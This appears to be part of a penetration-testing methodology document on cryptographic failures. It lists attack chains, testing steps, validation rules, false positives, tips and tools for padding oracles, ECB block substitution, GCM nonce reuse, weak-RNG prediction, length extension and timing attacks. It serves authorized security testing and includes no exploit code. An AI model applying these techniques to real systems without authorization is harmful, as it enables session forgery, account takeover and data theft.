- *GCM nonce reuse → forge arbitrary ciphertext under same key → ongoing impersonation.* Route: this file.
- *Weak RNG → predict password-reset token → account takeover.* Route: this file → `authentication_jwt.md`.
- *Length extension → MAC forgery → authorization-flag bypass.* Route: this file → BFLA.
- *Hardcoded key leak → mass session decrypt → cross-user data exfil.* Route: this file → `information_disclosure.md`.
- *ECB cookie structure leak → block substitution → attribute forgery.* Route: this file → BFLA.
- *Timing attack → HMAC key extraction → sign arbitrary messages.* Route: this file → authn.

## Advanced Testing Methodology

1. **Fingerprint the primitive first.** Which cipher, which mode, which hash. ECB vs CBC differs in attack. SHA-256 vs SHA-3 differs in extensibility.
2. **Hunt oracle distinguishers systematically.** Response status, time, body shape, header diff, downstream side effect. Build a two-category classifier.
3. **For each decrypt sink, test for padding oracle.** Flip one byte of IV, submit, observe response differential.
4. **For each MAC-protected sink, test for both length-extension AND timing.** Verify MAC is HMAC not raw SHA. Microbenchmark comparison timing.
5. **For every random token, test for predictability.** Collect 10-1000 samples; run through `randcrack` / V8 predictor / UUIDv1-decoder.
6. **For every ciphertext, test ECB first.** Submit 32 bytes of identical plaintext; if ciphertext has identical 16-byte blocks, ECB confirmed.

## Advanced Validation

- **Padding-oracle claim requires measurable byte recovery.** A theoretical oracle without demonstrated plaintext extraction is "oracle present, exploitation uncertain." Dry-run against known plaintext.
- **ECB claim requires reproducible identical-block observation.** Single-shot identical blocks could be chance; multi-user confirmation is firmer.
- **Weak-RNG claim requires predicted-next-value matching observed-next-value.** Build the predictor; verify against a next observation.
- **Length-extension claim requires a forged MAC accepted by the application.** Submit the forgery; confirm acceptance.
- **Timing-attack claim requires signal above noise.** 100 samples per byte of distinguishable timing with 95% confidence. 10 samples is noise.
- **Nonce-reuse claim requires observable nonce collision.** Trace network messages; log nonce values; identify reuse.

## False Positives

- A "random-looking" token that is actually CSPRNG-derived. Verify generator.
- An ECB-shaped ciphertext that is actually CBC with structured plaintext (padding + random IV → different blocks per invocation).
- A padding-oracle distinguisher that is actually a legitimate HTTP error path.
- A hardcoded "key" that is a key-wrapping-key for a KMS-backed real key.
- A length-extension claim on HMAC — immune by construction.
- A timing-attack claim with 10 samples — noise.
- A "nonce reuse" claim where nonces are actually random 128-bit values with birthday-space 2^64 (safe at reasonable message counts).

## Advanced Pro Tips

- **Oracle distinguishers can be ANY observable differential.** Response time, body shape, header diff, cookie-set, rate-limit header, downstream API call. Enumerate all channels.
- **CBC-R is bidirectional.** A padding oracle lets you decrypt AND encrypt — the former recovers secrets, the latter forges attacker-chosen messages.
- **GCM nonce reuse is one-shot catastrophic.** Even one nonce reuse breaks the key's integrity property forever.
- **Mersenne Twister needs 624 outputs; V8 XorShift128+ needs 5-8; LCG needs 2.** Match the attack cost to the generator identity.
- **UUIDv1 is NOT random.** Grep targets for `uuid.uuid1()` / `java.util.UUID.timeUUID()` and treat them as predictable.
- **HMAC output length matches hash output length.** SHA-256 HMAC is 32 bytes; SHA-512 HMAC is 64 bytes. Confirm via docs or by testing extension.
- **Timing attacks over cloud are hard but co-residency enables cache-side-channel.** Different attack class, different tooling.
- **Hardcoded key leak via container `ENV` is routine.** `docker inspect <image>` dumps all ENV variables including crypto keys.

## Advanced Tooling

- **PadBuster, python-paddingoracle, padboy** — automated CBC padding-oracle attacks.
- **hashpumpy, hash_extender** — length-extension attacks.
- **randcrack** — Python MT19937 state recovery.
- **v8-random-predictor** — V8 XorShift128+ predictor.
- **sagemath** — mathematical crypto analysis.
- **CyberChef** — crypto primitive manipulation.
- **cado-nfs, msieve** — factoring RSA moduli (academic only; current moduli are safe).
- **wrk/vegeta + timing analysis** — timing side-channel measurement.
- **gitleaks, truffleHog, detect-secrets** — hardcoded-key discovery.
- **AF_INET socket timing + perf_counter_ns** — microsecond-granularity local timing.

## Summary

The cryptographic-failures advanced tier is the full established technique surface at depth: padding-oracle byte-at-a-time with ambiguity handling and CBC-R forgery; ECB attribute recovery via block substitution and byte-at-a-time appended-secret extraction; IV/nonce reuse per AEAD (CBC two-time pad, GCM forbidden-attack authentication-key leak via GHASH polynomial, CTR counter reuse, ChaCha20-Poly1305 Poly1305-key leak); per-generator weak-RNG state recovery (MT19937 with 624-output `randcrack`, V8 XorShift128+ with 5-8-output Z3 solve, LCG with 2-output bruteforce, UUIDv1 time-based reconstruction, time-seeded srand window bruteforce); length-extension full protocol with secret-length bruteforce and non-applicability discipline (HMAC, SHA-3, BLAKE2 immune); timing attacks scaled across local/cross-process/network with signal-vs-noise thresholds; side-channel classes beyond timing (cache, power, EM); and WAF/mitigation-bypass patterns. Each CVE in `cryptographic_failures_novel_deep.md` reduces to one of these primitives.
